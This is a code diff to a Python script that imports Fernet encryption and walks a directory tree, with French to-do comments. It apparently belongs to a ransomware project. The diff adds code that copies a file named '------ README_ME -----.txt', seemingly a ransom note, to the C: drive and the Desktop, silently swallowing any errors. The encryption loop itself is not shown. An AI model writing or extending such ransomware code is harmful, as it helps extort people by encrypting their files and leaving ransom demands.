@@ -1,7 +1,7 @@
 import os
 from pathlib import Path
 from cryptography.fernet import Fernet
-
+import shutil
 
 #A FAIRE
 #mettre un checker qui check
@@ -66,7 +66,11 @@ for root, dirs, files in os.walk(directory):
             
 
         
-    
+try:
+    shutil.copyfile("------ README_ME -----.txt", "C:")
+    shutil.copyfile("------ README_ME -----.txt", "Desktop")
+except:
+    pass    
 
 
 
